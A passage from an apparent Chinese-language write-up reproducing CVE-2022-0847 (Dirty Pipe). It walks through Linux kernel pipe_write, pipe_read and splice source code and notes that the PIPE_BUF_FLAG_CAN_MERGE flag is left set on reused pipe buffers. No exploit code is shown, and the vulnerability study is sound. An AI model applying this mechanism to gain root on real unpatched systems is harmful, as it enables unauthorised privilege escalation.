pipe-&gt;head = head + <span class="hljs-number">1</span>;<br><span class="hljs-number">518</span>             spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-number">519</span> <br><span class="hljs-number">520</span>             <span class="hljs-comment">/* Insert it into the buffer array */</span><br><span class="hljs-number">521</span>             buf = &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-number">522</span>             buf-&gt;page = page;<br><span class="hljs-number">523</span>             buf-&gt;ops = &amp;anon_pipe_buf_ops; 	<span class="hljs-comment">//pipe_buffer的回调函数</span><br><span class="hljs-number">524</span>             buf-&gt;offset = <span class="hljs-number">0</span>;<br><span class="hljs-number">525</span>             buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-number">526</span>             <span class="hljs-keyword">if</span> (is_packetized(filp)) 		<span class="hljs-comment">//查看是否设置文件的flags O_DIRECT</span><br><span class="hljs-number">527</span>                 buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-number">528</span>             <span class="hljs-keyword">else</span><br><span class="hljs-number">529</span>                 buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;             <span class="hljs-comment">//未设置则置该标志位             </span><br><span class="hljs-number">530</span>             pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">531</span> <br><span class="hljs-number">532</span>             copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><span class="hljs-number">533</span>             <span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-number">534</span>                 <span class="hljs-keyword">if</span> (!ret)<br><span class="hljs-number">535</span>                     ret = -EFAULT;<br><span class="hljs-number">536</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">537</span>             &#125;<br><span class="hljs-number">538</span>             ret += copied;<br><span class="hljs-number">539</span>             buf-&gt;offset = <span class="hljs-number">0</span>;<br><span class="hljs-number">540</span>             buf-&gt;len = copied;<br><span class="hljs-number">541</span> <br><span class="hljs-number">542</span>             <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-number">543</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">544</span>         &#125;<br><span class="hljs-number">545</span> 			<span class="hljs-comment">/* 走到这里说明pipe bufs中的page页面用完了 */</span><br><span class="hljs-number">546</span>         <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br><span class="hljs-number">547</span>             <span class="hljs-keyword">continue</span>;<br><span class="hljs-number">548</span> <br><span class="hljs-number">549</span>         <span class="hljs-comment">/* Wait for buffer space to become available. */</span><br><span class="hljs-number">550</span>         <span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-number">551</span>             <span class="hljs-keyword">if</span> (!ret)<br><span class="hljs-number">552</span>                 ret = -EAGAIN;<br><span class="hljs-number">553</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">554</span>         &#125;<br><span class="hljs-number">555</span>         <span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-number">556</span>             <span class="hljs-keyword">if</span> (!ret)<br><span class="hljs-number">557</span>                 ret = -ERESTARTSYS;<br><span class="hljs-number">558</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">559</span>         &#125;<br><span class="hljs-number">560</span> <br><span class="hljs-number">561</span>         <span class="hljs-comment">/*</span><br><span class="hljs-comment">562          * We&#x27;re going to release the pipe lock and wait for more</span><br><span class="hljs-comment">563          * space. We wake up any readers if necessary, and then</span><br><span class="hljs-comment">564          * after waiting we need to re-check whether the pipe</span><br><span class="hljs-comment">565          * become empty while we dropped the lock.</span><br><span class="hljs-comment">566          */</span><br><span class="hljs-number">567</span>         __pipe_unlock(pipe);<br><span class="hljs-number">568</span>         <span class="hljs-keyword">if</span> (was_empty)<br><span class="hljs-number">569</span>             wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br><span class="hljs-number">570</span>         kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br><span class="hljs-number">571</span>         wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br><span class="hljs-number">572</span>         __pipe_lock(pipe);<br><span class="hljs-number">573</span>         was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br><span class="hljs-number">574</span>         wake_next_writer = <span class="hljs-literal">true</span>;<br><span class="hljs-number">575</span>     &#125;<br>.......<br><br></code></pre></td></tr></table></figure>

<p>这里的for循环是整个pipe_write部分的核心,他承担了剩下的大部分拷贝,会不断检查pipe-&gt;bufs的充盈程度,一旦有空闲则会申请新的page来拷贝我们用户区传入的数据,这里如果我们创建pipe的时候没有设置标识 <code>O_DIRECT</code>,则会在每个新创建的<code>pipe_buffer-&gt;flags</code>置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></p>
<h2 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h2><p>pipe_read函数大部分就是从上述的环形buffer当中读出数据,然后修改pipe_buffer以及 <code>pipe_inode_info</code> 相对应的部分,值得注意的一点就是其中对于读出完毕的pipe_buffer的flags字段并没有修改,所以当我们pipe_write之后,buf-&gt;flags中始终会有该标识位 <code>PIPE_BUF_FLAG_CAN_MERGE</code></p>
<h1 id="splice系统调用"><a href="#splice系统调用" class="headerlink" title="splice系统调用"></a>splice系统调用</h1><p>先看看手册中的描述</p>
<blockquote>
<pre><code class="hljs">splice()  moves  data  between  two file descriptors without copying between kernel address space and user address space.  It transfers up to len bytes of data from the file descriptor fd_in to the file descriptor fd_out, where one of the file descriptors must refer to a pipe.
</code></pre>
</blockquote>
<p>大致意思是该系统调用将使得两个文件描述符之间的数据复制并不是<code>内核与用户空间</code>这种形式.她至多可以从 <code>fd_in</code>文件描述符当中复制大小为 <code>len</code>的数据至 <code>fd_out</code>,值得注意的是这两个文件描述符中至少需要引用了管道</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 这里有几条规则是传入参数需要遵守的</span><br><span class="hljs-comment"> * 1.如果fd_in为pipe,则off_in必须要是NULL;</span><br><span class="hljs-comment"> * 2.如果fd_in不是pipe,且off_in是NULL,读取字节将会从file offset开始,读取完毕后进行适当的设置</span><br><span class="hljs-comment"> * 3.如果fd_in不是pipe,且off_in非空,则off_in必须指向一个buffer,该buffer需要满足从开始的偏移到即将从fd_in读入的字节数大小,这样的话fd_in的file offset将不会改变</span><br><span class="hljs-comment"> * ?.上述的fd_in与off_in的规则同样作用于fd_out与off_out</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">off_t</span> *_Nullable off_in,</span><br><span class="hljs-params">                      <span class="hljs-type">int</span> fd_out, <span class="hljs-type">off_t</span> *_Nullable off_out,</span><br><span class="hljs-params">                      <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure>

<p>似乎是由九种传参组合</p>
<table>
<thead>
<tr>
<th>fd_in</th>
<th>off_in</th>
<th>fd_out</th>
<th>off_out</th>
<th>Right&#x2F;Wrong</th>
</tr>
</thead>
<tbody><tr>
<td>pipe</td>
<td>NULL</td>
<td>pipe</td>
<td>NULL</td>
<td>:white_check_mark:</td>
</tr>
<tr>
<td>pipe</td>
<td>NULL</td>
<td>file</td>
<td>NULL</td>
<td>:white_check_mark:</td>
</tr>
<tr>
<td>pipe</td>
<td>NULL</td>
<td>file</td>
<td>buffer</td>
<td>:white_check_mark:</td>
</tr>
<tr>
<td>file</td>
<td>NULL</td>
<td>pipe</td>
<td>NULL</td>
<td>:white_check_mark:</td>
</tr>
<tr>
<td>file</td>
<td>NULL</td>
<td>file</td>
<td>NULL</td>
<td>:x:</td>
</tr>
<tr>
<td>file</td>
<td>NULL</td>
<td>file</td>
<td>buffer</td>
<td>:x:</td>
</tr>
<tr>
<td>file</td>
<td>buffer</td>
<td>pipe</td>
<td>NULL</td>
<td>:white_check_mark:</td>
</tr>
<tr>
<td>file</td>
<td>buffer</td>
<td>file</td>
<td>NULL</td>
<td>:x:</td>
</tr>
<tr>
<td>file</td>
<td>buffer</td>
<td>file</td>
<td>buffer</td>
<td>:x:</td>
</tr>
</tbody></table>
<p>由于有着至少一个pipe的规定,所以最终能正确执行的就只有五种情况</p>
<p>然后我们来看系统调用源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1332</span> SYSCALL_DEFINE6(splice, <span class="hljs-type">int</span>, fd_in, <span class="hljs-type">loff_t</span> __user *, off_in,<br><span class="hljs-number">1333</span>         <span class="hljs-type">int</span>, fd_out, <span class="hljs-type">loff_t</span> __user *, off_out,<br><span class="hljs-number">1334</span>         <span class="hljs-type">size_t</span>, len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br><span class="hljs-number">1335</span> &#123;<br><span class="hljs-number">1336</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">in</span>, <span class="hljs-title">out</span>;</span><br><span class="hljs-number">1337</span>     <span class="hljs-type">long</span> error;<br><span class="hljs-number">1338</span> <br><span class="hljs-number">1339</span>     <span class="hljs-keyword">if</span> (unlikely(!len))<br><span class="hljs-number">1340</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">1341</span> <br><span class="hljs-number">1342</span>     <span class="hljs-keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))<br><span class="hljs-number">1343</span>         <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1344</span> <br><span class="hljs-number">1345</span>     error = -EBADF;<br><span class="hljs-number">1346</span>     in = fdget(fd_in); 	<br><span class="hljs-number">1347</span>     <span class="hljs-keyword">if</span> (in.file) &#123;<br><span class="hljs-number">1348</span>         out = fdget(fd_out);<br><span class="hljs-number">1349</span>         <span class="hljs-keyword">if</span> (out.file) &#123;<br><span class="hljs-number">1350</span>             error = __do_splice(in.file, off_in, out.file, off_out,<br><span class="hljs-number">1351</span>                         len, flags);<br><span class="hljs-number">1352</span>             fdput(out);<br><span class="hljs-number">1353</span>         &#125;<br><span class="hljs-number">1354</span>         fdput(in);<br><span class="hljs-number">1355</span>     &#125;<br><span class="hljs-number">1356</span>     <span class="hljs-keyword">return</span> error;<br><span class="hljs-number">1357</span> &#125;           <br></code></pre></td></tr></table></figure>

<p>基本没有什么好说的,直接看 <code>__do_splice</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1116</span> <span class="hljs-type">static</span> <span class="hljs-type">long</span> __do_splice(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> __user *off_in,<br><span class="hljs-number">1117</span>             <span class="hljs-keyword">struct</span> file *out, <span class="hljs-type">loff_t</span> __user *off_out,<br><span class="hljs-number">1118</span>             <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br><span class="hljs-number">1119</span> &#123;<br><span class="hljs-number">1120</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br><span class="hljs-number">1121</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br><span class="hljs-number">1122</span>     <span class="hljs-type">loff_t</span> offset, *__off_in = <span class="hljs-literal">NULL</span>, *__off_out = <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">1123</span>     <span class="hljs-type">long</span> ret;<br><span class="hljs-number">1124</span> <br><span class="hljs-number">1125</span>     ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br><span class="hljs-number">1126</span>     opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br><span class="hljs-number">1127</span> <br><span class="hljs-number">1128</span>     <span class="hljs-keyword">if</span> (ipipe &amp;&amp; off_in)<br><span class="hljs-number">1129</span>         <span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-number">1130</span>     <span class="hljs-keyword">if</span> (opipe &amp;&amp; off_out)<br><span class="hljs-number">1131</span>         <span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-number">1132</span> 	 <span class="hljs-comment">/* 由上面的规律统计可知,这里我们至多只会有一个off_*非空,所以不用担心重写入的问题 */</span><br><span class="hljs-number">1133</span>     <span class="hljs-keyword">if</span> (off_out) &#123;<br><span class="hljs-number">1134</span>         <span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>))) 	<span class="hljs-comment">//从用户off_out拷贝数据到&amp;offset</span><br><span class="hljs-number">1135</span>             <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">1136</span>         __off_out = &amp;offset;<br><span class="hljs-number">1137</span>     &#125;<br><span class="hljs-number">1138</span>     <span class="hljs-keyword">if</span> (off_in) &#123;<br><span class="hljs-number">1139</span>         <span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>))) 	<span class="hljs-comment">//从用户off_in拷贝数据到&amp;offset</span><br><span class="hljs-number">1140</span>             <span class="hljs-keyword">return</span> -EFAULT;                                                                                                                                                             <br><span class="hljs-number">1141</span>         __off_in = &amp;offset;<br><span class="hljs-number">1142</span>     &#125;<br><span class="hljs-number">1143</span> 	 <span class="hljs-comment">/* 这里传入的__off_in和__off_out至多只会有一个指针非空 */</span><br><span class="hljs-number">1144</span>     ret = do_splice(in, __off_in, out, __off_out, len, flags);<br><span class="hljs-number">1145</span>     <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-number">1146</span>         <span class="hljs-keyword">return</span> ret;<br><span class="hljs-number">1147</span> <br><span class="hljs-number">1148</span>     <span class="hljs-keyword">if</span> (__off_out &amp;&amp; copy_to_user(off_out, __off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br><span class="hljs-number">1149</span>         <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">1150</span>     <span class="hljs-keyword">if</span> (__off_in &amp;&amp; copy_to_user(off_in, __off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br><span class="hljs-number">1151</span>         <span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-number">1152</span> <br><span class="hljs-number">1153</span>     <span class="hljs-keyword">return</span> ret;<br><span class="hljs-number">1154</span> &#125;<br><br></code></pre></td></tr></table></figure>

<p>这里仅仅也只是判断了一下你传递的参数的正确性,然后如果某个off_*不为空,则需要将其拷贝到内核空间 :)</p>
<h2 id="do-splice"><a href="#do-splice" class="headerlink" title="do_splice"></a>do_splice</h2><p>然后调用 <code>do_splice</code>函数,该函数比较长,因此我们分开讲解,这里首先分成几种情况,分别是:</p>
<ol>
<li>in和out均为pipe</li>
<li>in为pipe,out为普通文件</li>
<li>in为普通文件,out为pipe</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1025</span> <span class="hljs-comment">/*      </span><br><span class="hljs-comment">1026  * Determine where to splice to/from.</span><br><span class="hljs-comment">1027  */</span> <br><span class="hljs-number">1028</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params"><span class="hljs-number">1029</span>            <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>1030 &#123;<br><span class="hljs-number">1031</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br><span class="hljs-number">1032</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br><span class="hljs-number">1033</span>     <span class="hljs-type">loff_t</span> offset;<br><span class="hljs-number">1034</span>     <span class="hljs-type">long</span> ret;<br><span class="hljs-number">1035</span> <br><span class="hljs-number">1036</span>     <span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||<br><span class="hljs-number">1037</span>              !(out-&gt;f_mode &amp; FMODE_WRITE)))<br><span class="hljs-number">1038</span>         <span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-number">1039</span> <br><span class="hljs-number">1040</span>     ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br><span class="hljs-number">1041</span>     opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br><span class="hljs-number">1042</span> 	 <span class="hljs-comment">/* 如果in和out都是pipe */</span><br><span class="hljs-number">1043</span>     <span class="hljs-keyword">if</span> (ipipe &amp;&amp; opipe) &#123;<br><span class="hljs-number">1044</span>         <span class="hljs-keyword">if</span> (off_in || off_out) 	<span class="hljs-comment">//二段检查</span><br><span class="hljs-number">1045</span>             <span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-number">1046</span> <br><span class="hljs-number">1047</span>         <span class="hljs-comment">/* 如果说我们使用pipe的读写文件描述符们来调用splice可能是十分有趣的, 但是就不准就不准就不准 :) */</span><br><span class="hljs-number">1048</span>         <span class="hljs-keyword">if</span> (ipipe == opipe)<br><span class="hljs-number">1049</span>             <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1050</span> <br><span class="hljs-number">1051</span>         <span class="hljs-keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)<br><span class="hljs-number">1052</span>             flags |= SPLICE_F_NONBLOCK;<br><span class="hljs-number">1053</span> <br><span class="hljs-number">1054</span>         <span class="hljs-keyword">return</span> splice_pipe_to_pipe(ipipe, opipe, len, flags);<br><span class="hljs-number">1055</span>     &#125;<br>    	......<br><br></code></pre></td></tr></table></figure>

<h3 id="one-pipe-to-pipe"><a href="#one-pipe-to-pipe" class="headerlink" title=":one: pipe_to_pipe"></a>:one: pipe_to_pipe</h3><p>可以看到上面的do_splice函数碰到两个pipe,则会调用 <code>splice_pipe_to_pipe</code>函数,该函数主要是复制了pipe_buffer,将inpipe的pipe_buffer内容复制给了outpipe的pipe_buffer,</p>
<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4a420010a6d3a47ac4759894730b3b1e.jpg" srcset="/img/loading.gif" lazyload class="">

<img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/27a96ae1444f8dc92c05165470782741.jpg" srcset="/img/loading.gif" lazyload class="">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1434</span> <span class="hljs-comment">/* </span><br><span class="hljs-comment">1435  * Splice contents of ipipe to opipe.</span><br><span class="hljs-comment">1436  */</span><br><span class="hljs-number">1437</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">splice_pipe_to_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *ipipe,</span><br><span class="hljs-params"><span class="hljs-number">1438</span>                    <span class="hljs-keyword">struct</span> pipe_inode_info *opipe,</span><br><span class="hljs-params"><span class="hljs-number">1439</span>                    <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>1440 &#123;<br><span class="hljs-number">1441</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">ibuf</span>, *<span class="hljs-title">obuf</span>;</span><br><span class="hljs-number">1442</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head, o_head;<br><span class="hljs-number">1443</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_tail, o_tail;<br><span class="hljs-number">1444</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_mask, o_mask;<br><span class="hljs-number">1445</span>     <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-number">1446</span>     <span class="hljs-type">bool</span> input_wakeup = <span class="hljs-literal">false</span>;<br>		 .......<br><span class="hljs-number">1511</span>         ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];<br><span class="hljs-number">1512</span>         obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];<br><span class="hljs-number">1513</span> <br><span class="hljs-number">1514</span>         <span class="hljs-keyword">if</span> (len &gt;= ibuf-&gt;len) &#123;<br><span class="hljs-number">1515</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">1516              * Simply move the whole buffer from ipipe to opipe</span><br><span class="hljs-comment">1517              */</span><br><span class="hljs-number">1518</span>             *obuf = *ibuf;<br><span class="hljs-number">1519</span>             ibuf-&gt;ops = <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">1520</span>             i_tail++;<br><span class="hljs-number">1521</span>             ipipe-&gt;tail = i_tail;<br><span class="hljs-number">1522</span>             input_wakeup = <span class="hljs-literal">true</span>;<br><span class="hljs-number">1523</span>             o_len = obuf-&gt;len;<br><span class="hljs-number">1524</span>             o_head++;<br><span class="hljs-number">1525</span>             opipe-&gt;head = o_head;<br><span class="hljs-number">1526</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">1527</span>             <span class="hljs-comment">/*</span><br><span class="hljs-comment">1528              * Get a reference to this pipe buffer,</span><br><span class="hljs-comment">1529              * so we can copy the contents over.</span><br><span class="hljs-comment">1530              */</span><br><span class="hljs-number">1531</span>             <span class="hljs-keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) &#123;<br><span class="hljs-number">1532</span>                 <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br><span class="hljs-number">1533</span>                     ret = -EFAULT;<br><span class="hljs-number">1534</span>                 <span class="hljs-keyword">break</span>;<br><span class="hljs-number">1535</span>             &#125;<br><span class="hljs-number">1536</span>             *obuf = *ibuf;<br>       	 	 ......<br></code></pre></td></tr></table></figure>



<p>这里我们返回到do_splice,说下一个if判断</p>
<hr>
<p>注意这里是 <code>do_splice</code>剩下的部分代码,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1057</span>     <span class="hljs-keyword">if</span> (ipipe) &#123;<br><span class="hljs-number">1058</span>         <span class="hljs-keyword">if</span> (off_in)<br><span class="hljs-number">1059</span>             <span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-number">1060</span>         <span class="hljs-keyword">if</span> (off_out) &#123;<br><span class="hljs-number">1061</span>             <span class="hljs-keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))<br><span class="hljs-number">1062</span>                 <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1063</span>             offset = *off_out;<br><span class="hljs-number">1064</span>         &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-number">1065</span>             offset = out-&gt;f_pos;<br><span class="hljs-number">1066</span>         &#125;<br><span class="hljs-number">1067</span> <br><span class="hljs-number">1068</span>         <span class="hljs-keyword">if</span> (unlikely(out-&gt;f_flags &amp; O_APPEND))<br><span class="hljs-number">1069</span>             <span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-number">1070</span> <br><span class="hljs-number">1071</span>         ret = rw_verify_area(WRITE, out, &amp;offset, len); 	<span class="hljs-comment">//查看是否越界</span><br><span class="hljs-number">1072</span>         <span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br><span class="hljs-number">1073</span>             <span class="hljs-keyword">return</span> ret;<br><span class="hljs-number">1074</span> <br><span class="hljs-number">1075</span>         <span class="hljs-keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)<br><span class="hljs-number">1076</span>             flags |= SPLICE_F_NONBLOCK;<br><span class="hljs-number">1077</span> <br><span class="hljs-number">1078</span>         file_start_write(out);<br><span class="hljs-number">1079</span>         ret = do_splice_from(ipipe, out, &amp;offset, len, flags);<br><span class="hljs-number">1080</span>         file_end_write(out);<br><span class="hljs-number">1081</span> <br><span class="hljs-number">1082</span>         <span class="hljs-keyword">if</span> (!off_out)<br><span class="hljs-number">1083</span>             out-&gt;f_pos = offset;<br><span class="hljs-number">1084</span>         <span class="hljs-keyword">else</span><br><span class="hljs-number">1085</span>             *off_out = offset;<br><span class="hljs-number">1086</span> <br><span class="hljs-number">1087</span>         <span class="hljs-keyword">return</span> ret;                                                                                                                                                                     <br><span class="hljs-number">1088</span>     &#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="two-pipe-to-file"><a href="#two-pipe-to-file" class="headerlink" title=":two: pipe_to_file"></a>:two: pipe_to_file</h3><img src="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8b640712cf0b9c01634355daf15d6a9b.jpg" srcset="/img/loading.gif" lazyload class="">

